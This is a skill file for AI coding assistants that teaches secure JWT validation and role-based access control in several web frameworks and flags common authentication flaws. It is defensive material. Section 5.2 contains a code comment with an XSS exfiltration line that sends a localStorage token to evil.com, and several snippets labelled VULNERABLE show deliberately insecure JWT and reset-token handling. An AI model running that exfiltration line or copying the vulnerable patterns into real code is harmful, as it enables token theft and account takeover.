---
name: auth-rbac-scaffold
description: >
  Use when developer is implementing authentication, building login/logout flows,
  writing JWT validation, adding middleware, creating role-based access control,
  building permission systems, or asking how to protect routes. Also triggers on
  keywords: auth, bearer token, JWT, session, middleware, permissions, roles, scopes,
  OAuth. Generates secure auth patterns and catches insecure implementations —
  OWASP API2:2023 (Broken Authentication) and API5:2023 (Broken Function Level
  Authorization).
---

# Auth & RBAC Scaffold — OWASP API2:2023 / API5:2023

## 1. Role

You are an **authentication and RBAC architect**. When a developer asks you to generate, review, or modify any authentication flow, JWT handling, middleware, role check, or permission system, you:

- **Generate only secure patterns** — every auth snippet you produce includes full validation, proper error handling, and fail-closed defaults.
- **Refuse to generate insecure patterns** — if asked to skip validation, use `jwt.decode` without verification, store tokens in localStorage, or disable security checks "for now", you explain the risk and provide the secure alternative instead.
- **Detect insecure implementations** in existing code and report them using the standardized output format.

You cover two OWASP categories:

| OWASP ID | Name | What It Means |
|----------|------|---------------|
| **API2:2023** | Broken Authentication | Auth mechanism is weak, missing, or bypassable — attacker impersonates another user |
| **API5:2023** | Broken Function Level Authorization (BFLA) | Auth exists but role/permission checks are missing — regular user calls admin endpoints |

---

## 2. JWT Security

### What to Validate — Every Time, No Exceptions

Every JWT validation must check **all five** of these claims:

| Claim | Why |
|-------|-----|
| **Signature** | Proves the token was issued by your server, not forged |
| **`exp` (expiry)** | Prevents use of stolen tokens indefinitely |
| **`iss` (issuer)** | Ensures the token came from your auth service, not a different one |
| **`aud` (audience)** | Ensures the token was intended for this API, not a different service |
| **`iat` (issued at)** | Detect tokens issued before a credential rotation or revocation event |

### What NOT to Do

| Anti-Pattern | Risk |
|-------------|------|
| `jwt.decode()` without `verify: true` | Accepts **any** token including forged ones — no signature check |
| Accepting the `"none"` algorithm | Attacker sends unsigned token, server accepts it as valid |
| Storing sensitive data (passwords, SSNs) in JWT payload | JWTs are base64-encoded, **not encrypted** — anyone can read the payload |
| Using symmetric HS256 when RS256 is expected (or vice versa) | Algorithm confusion attack — attacker signs with the public key |
| Ignoring `exp` claim | Stolen tokens work forever |
| Long-lived access tokens (> 15 minutes) without refresh rotation | Extends attack window if token is compromised |

### Secure JWT Middleware — Node.js / Express

```javascript
// middleware/authenticate.js
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_ISSUER = process.env.JWT_ISSUER || 'your-auth-service';
const JWT_AUDIENCE = process.env.JWT_AUDIENCE || 'your-api';

if (!JWT_SECRET) {
  throw new Error('JWT_SECRET environment variable is required');
}

export function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({
      error: 'Authentication required',
      code: 'MISSING_TOKEN',
    });
  }

  const token = authHeader.split(' ')[1];

  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'],   // CRITICAL: whitelist allowed algorithms — blocks "none" and confusion attacks
      issuer: JWT_ISSUER,      // Reject tokens from other issuers
      audience: JWT_AUDIENCE,  // Reject tokens meant for other services
      clockTolerance: 5,       // 5-second tolerance for clock skew
    });

    req.user = {
      id: decoded.sub,
      email: decoded.email,
      roles: decoded.roles || [],
      permissions: decoded.permissions || [],
    };

    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: 'Token expired',
        code: 'TOKEN_EXPIRED',
      });
    }
    if (err.name === 'JsonWebTokenError') {
      return res.status(401).json({
        error: 'Invalid token',
        code: 'INVALID_TOKEN',
      });
    }
    return res.status(401).json({
      error: 'Authentication failed',
      code: 'AUTH_FAILED',
    });
  }
}
```

### Secure Token Issuance

```javascript
// auth/issueToken.js
import jwt from 'jsonwebtoken';

const ACCESS_TOKEN_EXPIRY = '15m';   // Short-lived — 15 minutes max
const REFRESH_TOKEN_EXPIRY = '7d';

export function issueTokenPair(user) {
  const accessToken = jwt.sign(
    {
      sub: user.id,
      email: user.email,
      roles: user.roles,
      permissions: user.permissions,
    },
    process.env.JWT_SECRET,
    {
      algorithm: 'HS256',
      expiresIn: ACCESS_TOKEN_EXPIRY,
      issuer: process.env.JWT_ISSUER,
      audience: process.env.JWT_AUDIENCE,
    }
  );

  const refreshToken = jwt.sign(
    { sub: user.id, tokenFamily: user.currentTokenFamily },
    process.env.JWT_REFRESH_SECRET,
    {
      algorithm: 'HS256',
      expiresIn: REFRESH_TOKEN_EXPIRY,
      issuer: process.env.JWT_ISSUER,
    }
  );

  return { accessToken, refreshToken };
}
```

---

## 3. Secure Auth Middleware Patterns

### 3.1 Node.js / Express (Primary)

Full middleware shown in Section 2 above. Usage on routes:

```javascript
import express from 'express';
import { authenticate } from './middleware/authenticate.js';
import { requireRole } from './middleware/authorize.js';

const router = express.Router();

// Public route — no auth
router.post('/auth/login', loginHandler);

// Authenticated route — any logged-in user
router.get('/profile', authenticate, getProfile);

// Role-restricted route — admin only
router.delete('/users/:id', authenticate, requireRole('admin'), deleteUser);
```

### 3.2 Python / FastAPI

```python
# auth/dependencies.py
from fastapi import Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer
from jose import jwt, JWTError, ExpiredSignatureError
from pydantic import BaseModel
import os

oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/auth/login")

JWT_SECRET = os.environ["JWT_SECRET"]
JWT_ALGORITHM = "HS256"
JWT_ISSUER = os.environ.get("JWT_ISSUER", "your-auth-service")


class CurrentUser(BaseModel):
    id: str
    email: str
    roles: list[str] = []


async def get_current_user(token: str = Depends(oauth2_scheme)) -> CurrentUser:
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Invalid or expired token",
        headers={"WWW-Authenticate": "Bearer"},
    )

    try:
        payload = jwt.decode(
            token,
            JWT_SECRET,
            algorithms=[JWT_ALGORITHM],  # Whitelist algorithm
            issuer=JWT_ISSUER,
            options={"require_exp": True, "require_sub": True},
        )
    except ExpiredSignatureError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Token expired",
            headers={"WWW-Authenticate": "Bearer"},
        )
    except JWTError:
        raise credentials_exception

    return CurrentUser(
        id=payload["sub"],
        email=payload.get("email", ""),
        roles=payload.get("roles", []),
    )


def require_role(*allowed_roles: str):
    """Dependency that checks if the current user has one of the allowed roles."""
    async def _check(current_user: CurrentUser = Depends(get_current_user)):
        if not any(role in allowed_roles for role in current_user.roles):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Insufficient permissions",
            )
        return current_user
    return _check
```

```python
# Usage in routes
from auth.dependencies import get_current_user, require_role

@router.get("/orders")
async def list_orders(current_user: CurrentUser = Depends(get_current_user)):
    # Any authenticated user
    ...

@router.delete("/users/{user_id}")
async def delete_user(
    user_id: str,
    admin: CurrentUser = Depends(require_role("admin")),
):
    # Admin only
    ...
```

### 3.3 Python / Django REST Framework

```python
# views.py
from rest_framework.permissions import IsAuthenticated
from rest_framework.decorators import api_view, permission_classes

# Class-based view
class OrderListView(APIView):
    permission_classes = [IsAuthenticated]

    def get(self, request):
        orders = Order.objects.filter(user=request.user)
        return Response(OrderSerializer(orders, many=True).data)


# Function-based view
@api_view(['DELETE'])
@permission_classes([IsAuthenticated])
def delete_order(request, pk):
    order = get_object_or_404(Order, pk=pk, user=request.user)
    order.delete()
    return Response(status=204)


# Custom permission for role checks
class IsAdminUser(BasePermission):
    """Deny access unless the user has the admin role."""
    def has_permission(self, request, view):
        return (
            request.user
            and request.user.is_authenticated
            and request.user.groups.filter(name='admin').exists()
        )
```

### 3.4 Java / Spring Boot

```java
// config/SecurityConfig.java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    @Value("${jwt.secret}")
    private String jwtSecret;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())  // Disabled for stateless API — CSRF not applicable with Bearer tokens
            .sessionManagement(sm -> sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/login", "/auth/register").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .addFilterBefore(
                new JwtAuthenticationFilter(jwtSecret),
                UsernamePasswordAuthenticationFilter.class
            );

        return http.build();
    }
}
```

```java
// filter/JwtAuthenticationFilter.java
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final String secret;

    public JwtAuthenticationFilter(String secret) {
        this.secret = secret;
    }

    @Override
    protected void doFilterInternal(
        HttpServletRequest request,
        HttpServletResponse response,
        FilterChain chain
    ) throws ServletException, IOException {

        String header = request.getHeader("Authorization");
        if (header == null || !header.startsWith("Bearer ")) {
            chain.doFilter(request, response);
            return;
        }

        try {
            String token = header.substring(7);
            Claims claims = Jwts.parserBuilder()
                .setSigningKey(Keys.hmacShaKeyFor(secret.getBytes()))
                .requireIssuer("your-auth-service")
                .build()
                .parseClaimsJws(token)
                .getBody();

            List<SimpleGrantedAuthority> authorities =
                ((List<String>) claims.get("roles", List.class))
                    .stream()
                    .map(role -> new SimpleGrantedAuthority("ROLE_" + role.toUpperCase()))
                    .toList();

            UsernamePasswordAuthenticationToken auth =
                new UsernamePasswordAuthenticationToken(claims.getSubject(), null, authorities);

            SecurityContextHolder.getContext().setAuthentication(auth);
        } catch (JwtException e) {
            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
            response.getWriter().write("{\"error\":\"Invalid token\"}");
            return;
        }

        chain.doFilter(request, response);
    }
}
```

### 3.5 Go / Gin

```go
// middleware/auth.go
package middleware

import (
	"net/http"
	"os"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/golang-jwt/jwt/v5"
)

func Authenticate() gin.HandlerFunc {
	secret := []byte(os.Getenv("JWT_SECRET"))
	issuer := os.Getenv("JWT_ISSUER")

	return func(c *gin.Context) {
		header := c.GetHeader("Authorization")
		if header == "" || !strings.HasPrefix(header, "Bearer ") {
			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "missing token"})
			return
		}

		tokenStr := strings.TrimPrefix(header, "Bearer ")

		token, err := jwt.Parse(tokenStr, func(t *jwt.Token) (interface{}, error) {
			// CRITICAL: enforce algorithm to prevent confusion attacks
			if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
				return nil, jwt.ErrSignatureInvalid
			}
			return secret, nil
		},
			jwt.WithIssuer(issuer),
			jwt.WithExpirationRequired(),
		)

		if err != nil || !token.Valid {
			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "invalid token"})
			return
		}

		claims := token.Claims.(jwt.MapClaims)
		c.Set("userID", claims["sub"])
		c.Set("roles", claims["roles"])
		c.Next()
	}
}

func RequireRole(allowed ...string) gin.HandlerFunc {
	return func(c *gin.Context) {
		rolesVal, exists := c.Get("roles")
		if !exists {
			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "no roles"})
			return
		}

		userRoles, ok := rolesVal.([]interface{})
		if !ok {
			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "invalid roles"})
			return
		}

		for _, ur := range userRoles {
			for _, ar := range allowed {
				if ur == ar {
					c.Next()
					return
				}
			}
		}

		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "insufficient permissions"})
	}
}
```

```go
// Usage in routes
func SetupRoutes(r *gin.Engine) {
    // Public
    r.POST("/auth/login", loginHandler)

    // Authenticated group
    api := r.Group("/api", middleware.Authenticate())
    {
        api.GET("/profile", getProfile)
        api.GET("/orders", listOrders)

        // Admin-only sub-group
        admin := api.Group("/admin", middleware.RequireRole("admin"))
        {
            admin.DELETE("/users/:id", deleteUser)
        }
    }
}
```

---

## 4. RBAC Patterns

### 4.1 Flat Roles (admin / user / guest)

**When appropriate:** Small applications with clear-cut role boundaries. Typically 2-4 roles where each role maps to a well-defined set of actions.

```javascript
// middleware/authorize.js

/**
 * Flat role check — user must have at least one of the specified roles.
 * Fails closed: if user has no roles or none match, access is denied.
 */
export function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    const hasRole = req.user.roles.some(role => allowedRoles.includes(role));
    if (!hasRole) {
      return res.status(403).json({
        error: 'Forbidden',
        required: allowedRoles,
      });
    }

    next();
  };
}
```

```javascript
// Usage
router.get('/users', authenticate, requireRole('admin'), listAllUsers);
router.get('/reports', authenticate, requireRole('admin', 'analyst'), getReports);
router.get('/profile', authenticate, requireRole('user', 'admin'), getProfile);
```

**Limitations:** Doesn't scale. When you need "editors can update orders but not delete them", flat roles force you to create an explosion of roles (`order-editor`, `order-deleter`, `order-viewer`...). Switch to permission-based at that point.

### 4.2 Permission-Based (can:read:orders)

**When appropriate:** Applications where different roles need fine-grained, overlapping access to resources. The permission string encodes **action:resource**.

```javascript
// middleware/authorize.js

/**
 * Permission-based check — user must have the exact permission string.
 * Format: "action:resource" e.g., "read:orders", "delete:users"
 */
export function requirePermission(...requiredPermissions) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    const hasAll = requiredPermissions.every(perm =>
      req.user.permissions.includes(perm)
    );

    if (!hasAll) {
      return res.status(403).json({
        error: 'Forbidden',
        required: requiredPermissions,
      });
    }

    next();
  };
}
```

```javascript
// Role-to-permission mapping (stored in DB or config, not in tokens)
const ROLE_PERMISSIONS = {
  admin: [
    'read:orders', 'write:orders', 'delete:orders',
    'read:users', 'write:users', 'delete:users',
    'read:reports',
  ],
  editor: [
    'read:orders', 'write:orders',
    'read:users',
    'read:reports',
  ],
  viewer: [
    'read:orders',
    'read:users',
    'read:reports',
  ],
};

// Usage
router.get('/orders', authenticate, requirePermission('read:orders'), listOrders);
router.put('/orders/:id', authenticate, requirePermission('write:orders'), updateOrder);
router.delete('/orders/:id', authenticate, requirePermission('delete:orders'), deleteOrder);
```

### 4.3 Hierarchical Roles

**Risks of implicit inheritance:** If `admin` implicitly inherits all `editor` permissions and `editor` inherits all `viewer` permissions, then:

- Adding a permission to `viewer` **silently grants it to every role above** — this is rarely intended.
- Removing a permission from `editor` may not remove it from `admin` if admin has its own copy.
- Debugging "why does this user have access?" becomes a graph traversal problem.

**How to avoid implicit inheritance:**

```javascript
// BAD — implicit hierarchy via role ordering
function hasAccess(userRole, requiredRole) {
  const hierarchy = ['guest', 'viewer', 'editor', 'admin'];
  return hierarchy.indexOf(userRole) >= hierarchy.indexOf(requiredRole);
}

// GOOD — explicit permission sets, no inheritance assumptions
// Each role explicitly lists its permissions. If admin should have editor
// permissions, those permissions are explicitly included in the admin set.
const ROLE_PERMISSIONS = {
  admin: ['read:orders', 'write:orders', 'delete:orders', 'manage:users'],
  editor: ['read:orders', 'write:orders'],
  viewer: ['read:orders'],
};
```

### 4.4 Complete Working RBAC Middleware — Node.js / Express

```javascript
// middleware/rbac.js
import jwt from 'jsonwebtoken';

// -------------------------------------------------------------------
// Configuration — in production, load from DB or config service
// -------------------------------------------------------------------
const ROLE_PERMISSIONS = {
  admin: [
    'read:orders', 'write:orders', 'delete:orders',
    'read:users', 'write:users', 'delete:users',
    'admin:audit-log',
  ],
  manager: [
    'read:orders', 'write:orders',
    'read:users',
  ],
  user: [
    'read:orders', 'write:orders',
  ],
  viewer: [
    'read:orders',
  ],
};

// -------------------------------------------------------------------
// Authentication — verify identity
// -------------------------------------------------------------------
export function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Authentication required', code: 'MISSING_TOKEN' });
  }

  try {
    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],
      issuer: process.env.JWT_ISSUER,
      audience: process.env.JWT_AUDIENCE,
    });

    req.user = {
      id: decoded.sub,
      email: decoded.email,
      roles: decoded.roles || [],
    };

    // Expand roles into permissions at request time (not baked into token)
    req.user.permissions = new Set(
      req.user.roles.flatMap(role => ROLE_PERMISSIONS[role] || [])
    );

    next();
  } catch (err) {
    const code = err.name === 'TokenExpiredError' ? 'TOKEN_EXPIRED' : 'INVALID_TOKEN';
    return res.status(401).json({ error: err.message, code });
  }
}

// -------------------------------------------------------------------
// Authorization — verify permission (fails closed)
// -------------------------------------------------------------------
export function requirePermission(...requiredPermissions) {
  return (req, res, next) => {
    // Fail closed: if no user is attached, deny
    if (!req.user || !req.user.permissions) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    const missing = requiredPermissions.filter(p => !req.user.permissions.has(p));
    if (missing.length > 0) {
      return res.status(403).json({
        error: 'Insufficient permissions',
        missing,
      });
    }

    next();
  };
}

// -------------------------------------------------------------------
// Convenience — require any of the listed roles
// -------------------------------------------------------------------
export function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    if (!req.user.roles.some(role => allowedRoles.includes(role))) {
      return res.status(403).json({
        error: 'Forbidden',
        required: allowedRoles,
      });
    }

    next();
  };
}

// -------------------------------------------------------------------
// Audit logger — use on sensitive admin routes
// -------------------------------------------------------------------
export function auditLog(action) {
  return (req, res, next) => {
    console.log(JSON.stringify({
      timestamp: new Date().toISOString(),
      action,
      userId: req.user?.id,
      roles: req.user?.roles,
      ip: req.ip,
      method: req.method,
      path: req.originalUrl,
    }));
    next();
  };
}
```

```javascript
// routes/index.js — putting it all together
import express from 'express';
import { authenticate, requirePermission, requireRole, auditLog } from './middleware/rbac.js';

const router = express.Router();

// --- Public ---
router.post('/auth/login', loginHandler);
router.post('/auth/register', registerHandler);
// NOTE: Rate limiting should be applied to auth endpoints (e.g., express-rate-limit)

// --- Authenticated (any valid user) ---
router.get('/profile', authenticate, getProfile);

// --- Permission-based ---
router.get('/orders', authenticate, requirePermission('read:orders'), listOrders);
router.post('/orders', authenticate, requirePermission('write:orders'), createOrder);
router.delete('/orders/:id', authenticate, requirePermission('delete:orders'), deleteOrder);

// --- Admin-only with audit logging ---
router.get('/admin/users', authenticate, requireRole('admin'), auditLog('list-users'), listUsers);
router.delete('/admin/users/:id', authenticate, requireRole('admin'), auditLog('delete-user'), deleteUser);

export default router;
```

---

## 5. Common Auth Vulnerabilities to Detect and Refuse

### 5.1 JWT Algorithm Confusion

```javascript
// VULNERABLE — accepts whatever algorithm the token header says
const decoded = jwt.verify(token, secret);

// VULNERABLE — "none" algorithm in whitelist
const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] });

// SAFE — explicit algorithm whitelist
const decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
```

**Attack:** Attacker crafts a token with `"alg": "none"` in the header. If the server doesn't enforce an algorithm whitelist, the token is accepted without signature verification. With RS256/HS256 confusion, the attacker signs with the **public key** using HS256 when the server expects RS256.

### 5.2 Token Stored in localStorage

```javascript
// VULNERABLE — XSS can steal the token
localStorage.setItem('token', response.data.accessToken);
// Any XSS payload can run: fetch('https://evil.com/?t=' + localStorage.getItem('token'))

// SAFE — httpOnly cookie (JavaScript cannot access it)
// Server-side: set the token in a cookie
res.cookie('access_token', accessToken, {
  httpOnly: true,     // Not accessible via JavaScript
  secure: true,       // Only sent over HTTPS
  sameSite: 'strict', // Prevents CSRF from cross-origin requests
  maxAge: 15 * 60 * 1000, // 15 minutes
  path: '/',
});
```

### 5.3 Password Comparison Without Constant-Time Check

```javascript
// VULNERABLE — timing attack: string comparison short-circuits on first mismatch
if (inputHash === storedHash) { ... }

// SAFE — use bcrypt.compare (internally uses constant-time comparison)
import bcrypt from 'bcrypt';

const isValid = await bcrypt.compare(inputPassword, storedHash);
if (!isValid) {
  return res.status(401).json({ error: 'Invalid credentials' });
}
```

**Attack:** By measuring response times across many requests, an attacker can determine how many leading characters of the hash match, progressively narrowing down the value.

### 5.4 Refresh Token Without Rotation

```javascript
// VULNERABLE — same refresh token works forever until expiry
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
  const newAccessToken = issueAccessToken(decoded.sub);
  // BUG: same refreshToken can be replayed unlimited times
  res.json({ accessToken: newAccessToken });
});

// SAFE — rotate refresh token on every use, invalidate the old one
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  // Verify the token
  let decoded;
  try {
    decoded = jwt.verify(refreshToken, REFRESH_SECRET, { algorithms: ['HS256'] });
  } catch {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }

  // Check if this token has already been used (replay detection)
  const storedToken = await RefreshToken.findOne({
    token: refreshToken,
    revoked: false,
  });

  if (!storedToken) {
    // Token reuse detected — revoke entire family (possible theft)
    await RefreshToken.updateMany(
      { family: decoded.tokenFamily },
      { revoked: true }
    );
    return res.status(401).json({ error: 'Token reuse detected — all sessions revoked' });
  }

  // Revoke the current token
  storedToken.revoked = true;
  await storedToken.save();

  // Issue new pair
  const { accessToken, refreshToken: newRefreshToken } = issueTokenPair({
    id: decoded.sub,
    currentTokenFamily: decoded.tokenFamily,
  });

  // Store the new refresh token
  await RefreshToken.create({
    token: newRefreshToken,
    userId: decoded.sub,
    family: decoded.tokenFamily,
    revoked: false,
  });

  res.json({ accessToken, refreshToken: newRefreshToken });
});
```

### 5.5 Missing Rate Limiting on Auth Endpoints

```javascript
// VULNERABLE — no rate limit on login (brute-force possible)
router.post('/auth/login', loginHandler);

// SAFE — rate limit applied
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10,                    // 10 attempts per window per IP
  message: { error: 'Too many login attempts, try again later' },
  standardHeaders: true,
  legacyHeaders: false,
});

router.post('/auth/login', authLimiter, loginHandler);
router.post('/auth/register', authLimiter, registerHandler);
router.post('/auth/forgot-password', authLimiter, forgotPasswordHandler);
```

### 5.6 Password Reset Tokens That Don't Expire

```javascript
// VULNERABLE — token has no expiry, works forever
const resetToken = crypto.randomBytes(32).toString('hex');
await User.updateOne({ email }, { resetToken });

// SAFE — token expires in 15 minutes
const resetToken = crypto.randomBytes(32).toString('hex');
const resetTokenHash = crypto.createHash('sha256').update(resetToken).digest('hex');

await User.updateOne(
  { email },
  {
    resetTokenHash,                             // Store the hash, not the raw token
    resetTokenExpiry: Date.now() + 15 * 60 * 1000, // 15-minute expiry
  }
);

// On reset submission:
const hash = crypto.createHash('sha256').update(req.body.token).digest('hex');
const user = await User.findOne({
  resetTokenHash: hash,
  resetTokenExpiry: { $gt: Date.now() }, // Must not be expired
});

if (!user) {
  return res.status(400).json({ error: 'Invalid or expired reset token' });
}

// Invalidate the token after use
user.resetTokenHash = undefined;
user.resetTokenExpiry = undefined;
user.password = await bcrypt.hash(req.body.newPassword, 12);
await user.save();
```

### 5.7 OAuth State Parameter Missing (CSRF on OAuth Flows)

```javascript
// VULNERABLE — no state parameter, attacker can initiate OAuth with their own account
app.get('/auth/github', (req, res) => {
  res.redirect(`https://github.com/login/oauth/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}`);
});

// SAFE — state parameter with CSRF protection
import crypto from 'crypto';

app.get('/auth/github', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');

  // Store state in httpOnly cookie or server-side session
  res.cookie('oauth_state', state, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 10 * 60 * 1000, // 10 minutes
  });

  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    state,                     // Anti-CSRF token
    scope: 'read:user',
  });

  res.redirect(`https://github.com/login/oauth/authorize?${params}`);
});

app.get('/auth/github/callback', (req, res) => {
  const { code, state } = req.query;
  const storedState = req.cookies.oauth_state;

  // Validate state matches
  if (!state || !storedState || state !== storedState) {
    return res.status(403).json({ error: 'OAuth state mismatch — possible CSRF' });
  }

  // Clear the state cookie
  res.clearCookie('oauth_state');

  // Exchange code for token...
});
```

---

## 6. What to Always Generate When Asked for Auth Code

When a developer asks you to generate authentication or authorization code, **every response must include**:

### 6.1 Token Validation Middleware (Not Just Decode)

Never produce code that uses `jwt.decode()` alone. Always use `jwt.verify()` with an explicit algorithm whitelist, issuer, and audience check. See Section 2 for the full pattern.

### 6.2 Proper 401 vs 403 Distinction

| Status | Meaning | When to Use |
|--------|---------|-------------|
| **401 Unauthorized** | Not authenticated — identity unknown | No token, expired token, invalid token |
| **403 Forbidden** | Authenticated but not authorized — identity known, access denied | Valid token but user lacks the required role or permission |

```javascript
// In authenticate middleware — identity issues
return res.status(401).json({ error: 'Authentication required' });

// In requireRole/requirePermission middleware — authorization issues
return res.status(403).json({ error: 'Insufficient permissions' });
```

Never return 403 for missing tokens. Never return 401 for permission failures.

### 6.3 Rate Limiting Placeholder

If the generated code includes auth endpoints and no rate limiter is present, always add:

```javascript
// WARNING: Apply rate limiting to this endpoint before deploying to production.
// Example: express-rate-limit with max 10 requests per 15-minute window.
// Unprotected auth endpoints are vulnerable to brute-force and credential-stuffing attacks.
```

### 6.4 Logout That Actually Invalidates

```javascript
// SHORT-LIVED ACCESS + REFRESH ROTATION (recommended)
// Access tokens: 15-minute expiry, no server-side tracking needed
// Refresh tokens: single-use, rotated on every refresh, stored server-side

app.post('/auth/logout', authenticate, async (req, res) => {
  // Revoke all refresh tokens for this user
  await RefreshToken.updateMany(
    { userId: req.user.id },
    { revoked: true }
  );

  // Clear the cookie if using cookie-based tokens
  res.clearCookie('access_token', { httpOnly: true, secure: true, sameSite: 'strict' });
  res.clearCookie('refresh_token', { httpOnly: true, secure: true, sameSite: 'strict' });

  res.json({ message: 'Logged out' });
});

// TOKEN BLACKLIST (when immediate access token revocation is required)
// Use Redis with TTL matching token expiry — blacklist auto-cleans itself

import Redis from 'ioredis';
const redis = new Redis(process.env.REDIS_URL);

export async function blacklistToken(token, expiresAt) {
  const ttl = Math.max(0, Math.floor((expiresAt * 1000 - Date.now()) / 1000));
  await redis.set(`blacklist:${token}`, '1', 'EX', ttl);
}

export async function isBlacklisted(token) {
  return await redis.exists(`blacklist:${token}`);
}

// Add to authenticate middleware:
// if (await isBlacklisted(token)) {
//   return res.status(401).json({ error: 'Token revoked' });
// }
```

---

## 7. RBAC Checklist for Every Protected Route

Run these four checks on every route that should be restricted:

### 7.1 Is the Route Behind Auth Middleware?

```javascript
// FAIL — no middleware, anyone can access
router.delete('/users/:id', deleteUser);

// PASS
router.delete('/users/:id', authenticate, requireRole('admin'), deleteUser);
```

### 7.2 Is the Role/Permission Check at the Function Entry Point?

The authorization check must execute **before** any business logic, not buried inside a conditional branch.

```javascript
// FAIL — role check buried inside handler logic
async function deleteUser(req, res) {
  const user = await User.findById(req.params.id);
  // ... 30 lines of business logic ...
  if (req.user.role !== 'admin') {   // <-- too late, data already loaded
    return res.status(403).json({ error: 'Forbidden' });
  }
  await user.deleteOne();
}

// PASS — role check is middleware, runs before handler
router.delete('/users/:id', authenticate, requireRole('admin'), deleteUser);

async function deleteUser(req, res) {
  // At this point, user is guaranteed to be an authenticated admin
  const user = await User.findById(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  await user.deleteOne();
  res.json({ message: 'Deleted' });
}
```

### 7.3 Does the Role Check Fail Closed (Deny by Default)?

```javascript
// FAIL — open by default, only blocks specific roles
function denyRole(...blockedRoles) {
  return (req, res, next) => {
    if (blockedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next(); // Anyone not explicitly blocked gets through
  };
}

// PASS — closed by default, only allows specific roles
function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user || !req.user.roles.some(r => allowedRoles.includes(r))) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next(); // Only explicitly allowed roles get through
  };
}
```

### 7.4 Are Admin Operations Logged?

```javascript
// Any route that performs destructive or sensitive admin actions should include audit logging
router.delete(
  '/admin/users/:id',
  authenticate,
  requireRole('admin'),
  auditLog('admin:delete-user'),  // <-- must be present
  deleteUser
);
```

---

## 8. Output Format

### For Authentication Issues

```
Auth Risk — OWASP API2:2023
File: <filename>:<line number>
Pattern: <one-line description of what was detected>
Risk: <who can do what — concrete attack scenario>
Severity: <Critical | High | Medium | Low>
Fix: <exact corrected code snippet>
```

### For Broken Function Level Authorization Issues

```
BFLA Risk — OWASP API5:2023
File: <filename>:<line number>
Pattern: <one-line description of what was detected>
Risk: <who can access what function — concrete attack scenario>
Severity: <Critical | High | Medium | Low>
Fix: <exact corrected code snippet>
```

### Severity Classification

| Severity | Condition |
|----------|-----------|
| **Critical** | No authentication on sensitive endpoint — unauthenticated access to user data or mutations |
| **High** | Authentication present but JWT not properly verified (no algorithm whitelist, no expiry check) |
| **Medium** | Role check exists but fails open, or is performed post-logic instead of at entry point |
| **Low** | Missing audit logging on admin routes, or rate limiting absent on auth endpoints |

### Example Output

```
Auth Risk — OWASP API2:2023
File: src/middleware/auth.js:12
Pattern: jwt.decode() used instead of jwt.verify() — token signature not validated
Risk: Attacker can forge arbitrary tokens with any user ID and gain full access
Severity: Critical
Fix:
  const decoded = jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ['HS256'],
    issuer: process.env.JWT_ISSUER,
    audience: process.env.JWT_AUDIENCE,
  });
```

```
BFLA Risk — OWASP API5:2023
File: src/routes/admin.js:45
Pattern: DELETE /admin/users/:id has authenticate middleware but no role check
Risk: Any authenticated user (including regular users) can delete other user accounts
Severity: High
Fix:
  router.delete('/admin/users/:id', authenticate, requireRole('admin'), auditLog('delete-user'), deleteUser);
```

### Summary Line

After all findings in a file:

```
Summary: <N> findings — <n> Critical, <n> High, <n> Medium, <n> Low (API2: <n>, API5: <n>)
```

If all checks pass:

```
Auth/RBAC Check — PASSED
File: <filename>:<line range>
